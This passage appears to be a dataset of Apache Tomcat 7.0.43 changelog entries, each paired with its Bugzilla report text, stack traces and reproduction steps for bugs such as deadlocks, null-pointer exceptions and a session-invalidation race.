	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1989)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1913)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
	at java.util.HashMap.readObject(HashMap.java:1155)
	at sun.reflect.GeneratedMethodAccessor89.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1004)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1891)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
	at java.util.HashMap.readObject(HashMap.java:1155)
	at sun.reflect.GeneratedMethodAccessor89.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1004)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1891)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1989)
	at java.io.ObjectInputStream.defaultReadObject(ObjectInputStream.java:499)
	at org.ajax4jsf.application.AjaxStateHolder.readObject(AjaxStateHolder.java:204)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1004)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1891)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
	at org.apache.catalina.session.StandardSession.readObject(StandardSession.java:1595)
	at org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:1060)
	at org.apache.catalina.session.JDBCStore.load(JDBCStore.java:657)
	at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:707)
	... 11 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55357
Catalina|Tomcat 7.0.43 (violetagg)|fix|55404|Log warnings about using security roles in web.xml without defining them as warnings. (markt)|ContextConfig#validateSecurityRoles emits three info log messages which contain a warning|"ContextConfig#validateSecurityRoles emits three info log messages but the messages start with 'WARNING:'. This is quite irrtating.

> contextConfig.role.auth=WARNING: Security role name {0} used in an <auth-constraint> without being defined in a <security-role>
> contextConfig.role.link=WARNING: Security role name {0} used in a <role-link> without being defined in a <security-role>
> contextConfig.role.runas=WARNING: Security role name {0} used in a <run-as> without being defined in a <security-role>

Remove the warning and set the log level from info to warning."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55404
Catalina|Tomcat 7.0.43 (violetagg)|fix|55439|Don't try a forced stop when stop -force is used if Tomcat has already been stopped. This avoids error messages when the PID file has been cleared. If a forced stop is required, improve handling of the case when the PID file can be read from or written to but not deleted. (markt)|'catalina.sh stop -force' doesn't account for empty pid file|When CATALINA_PID is provided to 'catalina.sh stop -force', but the script doesn't have permission to remove the file, the script instead clears the CATALINA_PID file's contents. The subsequent code for '-force' doesn't account for this and attempts to call kill an empty PID argument, leading to spurious error messages.|https://bz.apache.org/bugzilla/show_bug.cgi?id=55439
Catalina|Tomcat 7.0.43 (violetagg)|fix|55454|Avoid NPE when parsing an incorrect content type. (violetagg)|NullPointerException caused by invalid contentType, e.g. trailing semicolon|"possible related to 53353

When having an invalid contenttype like:
<jsp:directive.page language=""java"" contentType=""text/html;""/>
(note the trailing "";"") Tomcat throws a NullPointerException like this:

java.lang.NullPointerException
	org.apache.tomcat.util.http.parser.HttpParser.parseMediaType(HttpParser.java:217)
	org.apache.tomcat.util.http.parser.MediaTypeCache.parse(MediaTypeCache.java:54)
	org.apache.catalina.connector.Response.setContentType(Response.java:805)
	org.apache.catalina.connector.ResponseFacade.setContentType(ResponseFacade.java:245)
	javax.servlet.ServletResponseWrapper.setContentType(ServletResponseWrapper.java:123)

After removing the extra "";"" or entering a charset like this:
<jsp:directive.page language=""java"" contentType=""text/html; charset=UTF-8""/>
it works as expected.

My desired behaviour would be:
Don't crash with a NPE.
Other Tomcat versions seem to handly this different."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55454
Catalina|Tomcat 7.0.43 (violetagg)|update||Back-port the JSR-356 Java WebSocket 1.0 implementation from Tomcat 8. Note that use of this functionality requires Java 7. (markt)|||
Catalina|Tomcat 7.0.43 (violetagg)|update||Deprecate the Tomcat proprietary WebSocket API in favour of the new JSR-356 implementation. (markt)|||
Catalina|Tomcat 7.0.43 (violetagg)|fix|55494|Reduce severity of log message from warning to information for JNDI Realm connection issues where the JNDI Realm automatically re-tries the action that failed. Make clear in the log message that the action is being re-tried. (markt)|JNDIRealm throws exception after timeout / Connection reset|"Our tomcat is configured to use Windows 2012 AD with JNDI-Realm
When the application is running for some hours, the Tomcat logs exceptions because of timeouts.

Here is a stacktrace:

WARNING: Exception performing authentication
javax.naming.CommunicationException: Connection reset [Root exception is java.net.SocketException: Connection reset]; remaining name 'xxx'
	at com.sun.jndi.ldap.LdapCtx.doSearch(Unknown Source)
	at com.sun.jndi.ldap.LdapCtx.searchAux(Unknown Source)
	at com.sun.jndi.ldap.LdapCtx.c_search(Unknown Source)
	at com.sun.jndi.toolkit.ctx.ComponentDirContext.p_search(Unknown Source)
	at com.sun.jndi.toolkit.ctx.PartialCompositeDirContext.search(Unknown Source)
	at com.sun.jndi.toolkit.ctx.PartialCompositeDirContext.search(Unknown Source)
	at javax.naming.directory.InitialDirContext.search(Unknown Source)
	at org.apache.catalina.realm.JNDIRealm.getUserBySearch(JNDIRealm.java:1438)
	at org.apache.catalina.realm.JNDIRealm.getUser(JNDIRealm.java:1289)
	at org.apache.catalina.realm.JNDIRealm.getUser(JNDIRealm.java:1225)
	at org.apache.catalina.realm.JNDIRealm.getPrincipal(JNDIRealm.java:2086)
	at org.apache.catalina.realm.JNDIRealm.getPrincipal(JNDIRealm.java:2005)
	at org.apache.catalina.realm.RealmBase.authenticate(RealmBase.java:523)
	at org.apache.catalina.realm.CombinedRealm.authenticate(CombinedRealm.java:295)
	at org.apache.catalina.realm.LockOutRealm.authenticate(LockOutRealm.java:249)
	at org.apache.catalina.authenticator.SpnegoAuthenticator.authenticate(SpnegoAuthenticator.java:250)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:544)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)
	at org.apache.catalina.authenticator.SingleSignOn.invoke(SingleSignOn.java:341)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)
	at org.apache.coyote.ajp.AjpAprProcessor.process(AjpAprProcessor.java:197)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)
	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1852)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at java.lang.Thread.run(Unknown Source)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(Unknown Source)
	at java.net.SocketInputStream.read(Unknown Source)
	at java.io.BufferedInputStream.fill(Unknown Source)
	at java.io.BufferedInputStream.read1(Unknown Source)
	at java.io.BufferedInputStream.read(Unknown Source)
	at com.sun.jndi.ldap.Connection.run(Unknown Source)
	... 1 more

It seems that the LDAP-Lookup tries to search for the user within LDAP but the server already closed the Connection.

Looks like this cause:
http://stackoverflow.com/questions/10911897/tomcat-7-0-14-ldap-authentication"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55494
Catalina|Tomcat 7.0.43 (violetagg)|fix||Correct several incorrect formats of JdkLoggerFormatter. (kfujino)|||
Catalina|Tomcat 7.0.43 (violetagg)|fix|55521|Ensure that calls to HttpSession.invalidate() do not return until the session has been invalidated. Also ensure that checks on the validity of a session return a result consistent with any previous call to HttpSession.invalidate(). (markt)|Race Condition in HttpSession#invalidate() / HttpServletRequest#getSession(boolean)|"Created attachment 30798 [details]
code flow that exhibits the race condition

For session fixation protection, we have to discard a user's session and create a new one whenever the user's login state changes. For this we rely on Spring Security's SessionFixationProtectionStrategy that, at its core, uses the following commands:

  session.invalidate();
  session = request.getSession(true);

Yesterday, we had a message in the log that indicates the latter command returned the same session that was invalidated in the line before:
""Your servlet container did not change the session ID when a new session was created. You will not be adequately protected against session-fixation attacks (catalina-exec-339, org.springframework.security.web.authentication.session.SessionFixationProtectionStrategy, SessionFixationProtectionStrategy.java:102)""

When I investigated this issue, I found there is in fact a race condition if two threads (associated with requests from the same client) enter the session fixation protection code in parallel. I attached a TXT file that illustrates the code flow that leads to the race condition: When thread B calls session.invalidate(), the call returns immediately becuase the session is already in the ""expiring"" state. Since the session is not invalid yet, the call to request.getSession(true) won't create a new session, though. So in effect, thread B cannot obtain a new session.

The documentation at http://tomcat.apache.org/tomcat-7.0-doc/servletapi/ has no indication that a session may not yet be invalid when session.invalidate() returns. The session interface neither provides a way to detect ""expiring"" session.

The error message appears only once in the production log files that go some weeks back, so it seems to be an infrequent event. Nevertheless, it should be possible to implement session fixation without a race condition.

Regards
Christoph"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55521
Catalina|Tomcat 7.0.43 (violetagg)|fix|55524|Refactor to avoid a possible deadlock when handling an IOException during output when using Tomcat' proprietary (and deprecated) WebSocket API. (markt)|Deadlock produced during Websocket write operation (org.apache.catalina.websocket.WsOutbound)|"Created attachment 30800 [details]
thread dump of the deadlock

I use Tomcat with an application that uses Websockets. The websockets are handled by the Atmosphere framework: https://github.com/Atmosphere/atmosphere

A deadlock occurs during write operations to the websocket.

I have attached a thread dump of the deadlock. 

This issue is also duscussed here: 
https://github.com/Atmosphere/atmosphere/issues/1264


Here are the deadlocked threads: 


Found one Java-level deadlock:
=============================
""Atmosphere-Shared-AsyncOp-267"":
  waiting to lock monitor 0x00007efebc0015f8 (object 0x00000005ef4c6988, a org.apache.catalina.websocket.WsOutbound),
  which is held by ""Atmosphere-Scheduler-2""
""Atmosphere-Scheduler-2"":
  waiting to lock monitor 0x00007efe8c290ac0 (object 0x00000005ef4b77f8, a org.atmosphere.cpr.AtmosphereResourceImpl),
  which is held by ""Atmosphere-Shared-AsyncOp-267""

Java stack information for the threads listed above:
===================================================
""Atmosphere-Shared-AsyncOp-267"":
	at org.apache.catalina.websocket.WsOutbound.writeTextMessage(WsOutbound.java:165)
	- waiting to lock <0x00000005ef4c6988> (a org.apache.catalina.websocket.WsOutbound)
	at org.atmosphere.container.version.TomcatWebSocket.write(TomcatWebSocket.java:49)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:199)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:168)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:40)
	at org.atmosphere.cpr.AtmosphereResponse$2.write(AtmosphereResponse.java:574)
	at org.atmosphere.handler.AbstractReflectorAtmosphereHandler.onStateChange(AbstractReflectorAtmosphereHandler.java:169)
	at org.atmosphere.cpr.DefaultBroadcaster.invokeOnStateChange(DefaultBroadcaster.java:1027)
	at org.atmosphere.cpr.DefaultBroadcaster.prepareInvokeOnStateChange(DefaultBroadcaster.java:1047)
	at org.atmosphere.cpr.DefaultBroadcaster.executeAsyncWrite(DefaultBroadcaster.java:921)
	at org.atmosphere.cpr.DefaultBroadcaster$3.run(DefaultBroadcaster.java:580)
	- locked <0x00000005ef4b77f8> (a org.atmosphere.cpr.AtmosphereResourceImpl)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)
""Atmosphere-Scheduler-2"":
	at org.atmosphere.cpr.AsynchronousProcessor.completeLifecycle(AsynchronousProcessor.java:476)
	- waiting to lock <0x00000005ef4b77f8> (a org.atmosphere.cpr.AtmosphereResourceImpl)
	at org.atmosphere.cpr.AsynchronousProcessor.timedout(AsynchronousProcessor.java:437)
	at org.atmosphere.cpr.AsynchronousProcessor$AsynchronousProcessorHook.timedOut(AsynchronousProcessor.java:633)
	at org.atmosphere.websocket.DefaultWebSocketProcessor.close(DefaultWebSocketProcessor.java:483)
	at org.atmosphere.container.TomcatWebSocketHandler.onClose(TomcatWebSocketHandler.java:80)
	at org.apache.catalina.websocket.StreamInbound.doOnClose(StreamInbound.java:222)
	at org.apache.catalina.websocket.WsOutbound.doWriteBytes(WsOutbound.java:423)
	at org.apache.catalina.websocket.WsOutbound.doWriteText(WsOutbound.java:442)
	at org.apache.catalina.websocket.WsOutbound.writeTextMessage(WsOutbound.java:174)
	- locked <0x00000005ef4c6988> (a org.apache.catalina.websocket.WsOutbound)
	at org.atmosphere.container.version.TomcatWebSocket.write(TomcatWebSocket.java:49)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:199)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:168)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:40)
	at org.atmosphere.cpr.AtmosphereResponse$2.write(AtmosphereResponse.java:574)
	at org.atmosphere.cpr.AtmosphereResponse.write(AtmosphereResponse.java:992)
	at org.atmosphere.interceptor.HeartbeatInterceptor$1$1.call(HeartbeatInterceptor.java:104)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:178)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:292)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55524
Catalina|Tomcat 7.0.43 (violetagg)|fix||The loaded attribute never exists in PersistentManager. isLoaded is defined as operation in mbeans-descriptors. (kfujino)|||
Catalina|Tomcat 7.0.43 (violetagg)|add||Added logging of logging.properties location when system property org.apache.juli.ClassLoaderLogManager.debug=true is set.|||
Catalina|Tomcat 7.0.43 (violetagg)|fix|55570|Correctly log exceptions for all error conditions in the SPNEGO authenticator. (markt)|SpnegoAuthenticator: Resource file is missing placeholders for exceptions.|"In java/org/apache/catalina/authenticator/SpnegoAuthenticator.java problems are logged with an exception. The exception does not show up in the logging. The exception only shows up if I hack java/org/apache/catalina/authenticator/LocalStrings.properties in catalina.jar, and add a placeholder.


REPRODUCE:
- Configure SP-NEGO with Kerberos.
- Mess up your principal in com.sun.security.jgss.krb5.accept in jaas.config.
- Try to login. 
- See that you get something like:
FINE [org.apache.catalina.authenticator.SpnegoAuthenticator authenticate] Failed to validate client supplied ticket 

FIX:
In java/org/apache/catalina/authenticator/LocalStrings.properties please add [{0}] to the following lines:
spnegoAuthenticator.ticketValidateFail=Failed to validate client supplied ticket
spnegoAuthenticator.serviceLoginFail=Unable to login as the service principal
In SpnegoAuthenticator.java you can verify that exceptions are indeed passed to the log.

VALIDATE:
- Reproduce again
- See that you now get
Failed to validate client supplied ticket [GSSException: Failure unspecified at GSS-API level (Mechanism level: Invalid argument (400) - Cannot find key of appropriate type to decrypt AP REP - RC4 with HMAC)] 

The exception is not super-helpful, but at least it's something."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55570
Coyote|Tomcat 7.0.43 (violetagg)|fix|55228|Allow web applications to set a HTTP Date header. (markt)|AbstractHttp11Processor overwrites Date header, even when set by application|"If the application sets the Date header, then it is most likely for caching purposes and Tomcat needs to return it as is.



A consistent Date header is very important for proper Age/Max-Age calculations.

http://www.w3.org/Protocols/HTTP/Issues/add-age.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55228
Coyote|Tomcat 7.0.43 (violetagg)|add||Expose the current connection count for each protocol handler via JMX. (markt)|||
Coyote|Tomcat 7.0.43 (violetagg)|fix|55267|If an application configures a timeout for a Comet connection ensure it is only used for read and not write operations. This prevents a long timeout delaying the closing of the socket associated with a Comet connection after an error occurs. (markt)|NIO thread locked|"Did some load test and thread got stuck, see dump.

Basically I just simulate 100 users that connect and disconnect."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55267
Coyote|Tomcat 7.0.43 (violetagg)|fix||Ensure that java.lang.VirtualMachineErrors are not swallowed when using the HTTP or AJP NIO connectors. (markt)|||
Coyote|Tomcat 7.0.43 (violetagg)|fix|55399|Use the response locale to select the language to use for the status message in the HTTP response. (markt)|Request English but Response Spanish Language (Default Locale)|"== Server: Windows, Language: es_ES
== Client: Linux, Language: en_US

== Request:

POST /xxxxxx HTTP/1.1
Host: x.x.x.x:8080
Accept: */*
Accept-Language: en
Content-Length: 0
Content-Type: application/x-www-form-urlencoded

== Response:

HTTP/1.1 400 Petici√≥n incorrecta
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 1030
Date: Sat, 10 Aug 2013 17:25:17 GMT
Connection: close

...cut...

---

HTTP Response ""Petici√≥n incorrecta"" must be in English. Right?

I tried to do response.setLocale() workarround in the Servlet but neither works:

---
protected void doPost(HttpServletRequest request, HttpServletResponse response)
	throws ServletException, IOException {
// ...
	response.setLocale(Locale.ENGLISH); // Locale.US neither
// ...
	response.sendError(HttpServletResponse.SC_BAD_REQUEST, ""BAD REQUEST"");
}
---

HttpServletResponse.setLocale() don't honors?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55399
Coyote|Tomcat 7.0.43 (violetagg)|update||Refactor the connectors to support the new JSR-356 Java WebSocket 1.0 implementation. The most noticeable change is that the AJP APR/native and HTTP APR/native connectors no longer support multiple poller threads. Both connectors now use a single poller thread. (markt)|||
Coyote|Tomcat 7.0.43 (violetagg)|fix||Internally, content length is managed as a long. Fix a few places in the AJP connector where this was restricted to an int. (markt)|||
Coyote|Tomcat 7.0.43 (violetagg)|fix|55453|Ensure that the AJP connector does not permit response bodies to be included for responses with status codes and/or request methods that are not permitted to have a response body. (markt)|AJP send Body with Status 304|"When Status 304 is set to the Response, AJP send the Body to Apache2. In the HTTP-Connector there is a check against 304, see Method ""prepareResponse"" in Class org.apache.coyote.http11.AbstractHttp11Processor.

304 with Body will corrupt Apache2, see Bug https://issues.apache.org/bugzilla/show_bug.cgi?id=23181"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55453
Coyote|Tomcat 7.0.43 (violetagg)|fix|55500|Don't ignore the value of an asynchronous context timeout when using the AJP NIO connector. (markt)|AsyncListener.onTimeout is not called via AJP AjpNioProtocol connector|The AsyncListener.onTimeout is not called, when timeout occurs, when traffic routed via AJP connector configured with AjpNioProtocol protocol.|https://bz.apache.org/bugzilla/show_bug.cgi?id=55500
Coyote|Tomcat 7.0.43 (violetagg)|fix||Fix CVE-2013-4286: Better adherence to RFC2616 for content-length headers. (markt)|||
Coyote|Tomcat 7.0.43 (violetagg)|fix||Fix CVE-2013-4322: Add support for limiting the size of chunk extensions when using chunked encoding. (markt)|||
Coyote|Tomcat 7.0.43 (violetagg)|fix||Update the APR/native connector to version 1.1.28. Make this the minimum acceptable version as the correct behaviour of the JSR-356 WebSocket implementation when using the APR/native HTTP connector depends on a bug fix in the 1.1.28 release. (markt)|||
Jasper|Tomcat 7.0.43 (violetagg)|fix|55198|Ensure attribute values in tagx files that include EL and quoted XML characters are correctly quoted in the output. (markt)|Quote entity in html element attribute evaluated in tagx if attribute contains EL expression|"Created attachment 30535 [details]
War demonstrating the issue

Quote entity in html element attribute evaluated in tagx if attribute contains EL expression 

If your tagx file contains an html element such as
<a href=""#"" onclick=""window.alert(&quot;Hello World!&quot;)"">foobar</a>
It renders as
<a href=""#"" onclick=""window.alert(&quot;Hello World!&quot;)"">foobar</a>

If your tagx file contains an html element such as
<a href=""#"" onclick=""window.alert(&quot;${text}!&quot;)"">foobar</a>
It renders as (if text='foobar')
<a href=""#"" onclick=""window.alert(""foobar"")"">foobar</a>
Most browsers aren't too happy with this.

I would have expected this to render as
<a href=""#"" onclick=""window.alert(&quot;foobar&quot;)"">foobar</a>
I browsed through jsp 2.1 spec and couldn't identify anything that explicitly covered this, but I would expect valid xml output from a tagx file.

You don't see this behaviour if you use a tag file. We need to use tagx files to work around various problems in WebSphere and WebLogic containers.

A test war is attached. It is setup for servlet spec 2.5 and jsp 2.1 --- I am actually using a Tomcat 6 container, but thought I'd test this on the latest release.

The output I receive from the test war on tomcat 7.0.41:


<!DOCTYPE html>
<html>
	<head>
		<title>Test the output of tag and tagx containing quote entity in html element attribute</title>
	</head>
	<body>
		<p>.tag file gives:</p>
		



<ul>
	<li><a href=""#"" onclick=""window.alert(&quot;Hello World!&quot;)"">Click me to display &quot;Hello World!&quot;</a></li>
	<li><a href=""#"" onclick=""window.alert(&quot;foobar&quot;)"">Click me to display &quot;foobar&quot;</a></li>
</ul>

		<p>.tagx file gives:</p>
		<ul><li><a onclick=""window.alert(&quot;Hello World!&quot;)"" href=""#"">Click me to display ""Hello World!""</a></li><li><a onclick=""window.alert(""foobar"")"" href=""#"">Click me to display ""foobar""</a></li></ul>
	</body>
</html>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55198
Jasper|Tomcat 7.0.43 (violetagg)|fix||Ensure that javax.el.ELContext.getContext(Class) will throw NullPointerException when the provided class is null. (violetagg)|||
Jasper|Tomcat 7.0.43 (violetagg)|fix||Ensure that FeatureDescriptor objects returned by javax.el.MapELResolver.getFeatureDescriptors(ELContext,Object) will be created with a correct shortDescription - an empty string and a named attribute ELResolver.RESOLVABLE_AT_DESIGN_TIME - true. (violetagg)|||
Jasper|Tomcat 7.0.43 (violetagg)|fix||Ensure that FeatureDescriptor objects returned by javax.el.ResourceBundleELResolver.getFeatureDescriptors(ELContext,Object) will be created with a correct shortDescription - an empty string. javax.el.ResourceBundleELResolver.isReadOnly(ELContext,Object,Object) returns true if the base object is an instance of ResourceBundle. (violetagg)|||
Jasper|Tomcat 7.0.43 (violetagg)|fix|55207|Enforce the restriction that a <jsp:text> element may not contain any sub-elements from any namespace. Patch provided by Jeremy Boynes. (markt)|In XML syntax, jsp:text does not error on sub-elements from other namespaces|"Created attachment 30557 [details]
patch to reject on any element inside <jsp:text>

JspDocumentParser does check for sub-elements within a jsp:text element but only fails if they are from the jsp namespace"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55207
Jasper|Tomcat 7.0.43 (violetagg)|fix||Ensure that javax.el.ListELResolver.getFeatureDescriptors(ELContext,Object) will always return null. javax.el.ListELResolver.isReadOnly(ELContext,Object,Object) will return a result when the property cannot be coerced into an integer. (violetagg)|||
Jasper|Tomcat 7.0.43 (violetagg)|fix||Ensure that javax.el.ArrayELResolver.getFeatureDescriptors(ELContext,Object) will always return null. javax.el.ArrayELResolver.isReadOnly(ELContext,Object,Object) and javax.el.ArrayELResolver.getType(ELContext,Object,Object) will return a result when the property cannot be coerced into an integer. (violetagg)|||
Jasper|Tomcat 7.0.43 (violetagg)|fix|55309|Fix concurrency issue with JSP compilation and the tag plug-in manager. Patch provided by Sheldon Shao. (markt)|Concurrent issue of TagPluginManager|"Created attachment 30629 [details]
Patch on TagPluginManager

TagPluginManager is shared within ServletContext.
But it contains a variable ""PageInfo pageInfo"".
PageInfo should be aligned with specified page.

PageInfo is used for holding page information, such as ""Import"".
So when there are two pages are compiled in parallel.
It encounters concurrent issue.  One of the page can't be compiled unless the server is restarted."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55309
Jasper|Tomcat 7.0.43 (violetagg)|fix||Ensure that javax.el.BeanELResolver.getFeatureDescriptors(ELContext,Object) and javax.el.BeanELResolver.getCommonPropertyType(ELContext,Object) do not throw NullPointerException when the provided context is null. (violetagg)|||
Cluster|Tomcat 7.0.43 (violetagg)|add||Add new attribute terminateOnStartFailure. Set to true if you wish to terminate replication map when replication map fails to start. If replication map is terminated, associated context will fail to start. If you set this attribute to false, replication map does not end. It will try to join the map membership in the heartbeat. Default value is false. (kfujino)|||
Cluster|Tomcat 7.0.43 (violetagg)|fix||Avoid ConcurrentModificationException when sending a heartbeat. (kfujino)|||
Cluster|Tomcat 7.0.43 (violetagg)|fix||Avoid NPE when the channel fails to start. (kfujino)|||
Cluster|Tomcat 7.0.43 (violetagg)|fix|55301|Fix IllegalArgumentException thrown by simple test for McastService. (kfujino)|"java.lang.IllegalArgumentException: McastService:Required property ""tcpSecurePort"" is missing."|"When I try to run 
java org.apache.catalina.tribes.membership.McastService

It gives an exception
Exception in thread ""main"" java.lang.IllegalArgumentException: McastService:Required property ""tcpSecurePort"" is missing.
	at org.apache.catalina.tribes.membership.McastService.hasProperty(McastService.java:360)
	at org.apache.catalina.tribes.membership.McastService.start(McastService.java:381)
	at org.apache.catalina.tribes.membership.McastService.start(McastService.java:369)
	at org.apache.catalina.tribes.membership.McastService.main(McastService.java:701)

Tomcat version, 7.0.41"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55301
Cluster|Tomcat 7.0.43 (violetagg)|fix|55332|Fix NPE in FileMessageFactory.main when specify empty file as arguments. (kfujino)|empty input file cause exception in FileMessageFactory|"rm -rf inputFileX
touch inputFileX 

java org.apache.catalina.ha.deploy.FileMessageFactory inputFileX outputFileX


Exception in thread ""main"" java.lang.NullPointerException
	at org.apache.catalina.ha.deploy.FileMessageFactory.main(FileMessageFactory.java:379)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55332
Cluster|Tomcat 7.0.43 (violetagg)|fix||More definite thread name for MessageDispatch15Interceptor. (kfujino)|||
Web applications|Tomcat 7.0.43 (violetagg)|update||Remove the experimental label from the AJP NIO connector documentation. (markt)|||
Web applications|Tomcat 7.0.43 (violetagg)|fix||Correctly associated the default resource bundle with the English locale so that requests that specify an Accept-Language of English ahead of French, Spanish or Japanese get the English messages they asked for. (markt)|||
Web applications|Tomcat 7.0.43 (violetagg)|fix|55469|Fixed tags that were not properly closed. Based on a patch provided by Larry Shatzer, jr. (violetagg)|Missing HTML closing tags in Manager application|"Created attachment 30751 [details]
Patch to fix it on trunk for Tomcat 7 trunk.

In the ""WAR file to deploy"" that allows you to upload a war file, after the closing form tag, it is missing closing off the td and tr tag opened before form tag."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55469
Web applications|Tomcat 7.0.43 (violetagg)|update||The WebSocket examples in the examples web application have been changed to use the new JSR-356 Java WebSocket 1.0 implementation. (markt)|||
Web applications|Tomcat 7.0.43 (violetagg)|add||Add document for org.apache.catalina.tribes.group.GroupChannel. (kfujino)|||
Web applications|Tomcat 7.0.43 (violetagg)|fix||Correct Realm Component page of Tomcat documentation. (violetagg)|||
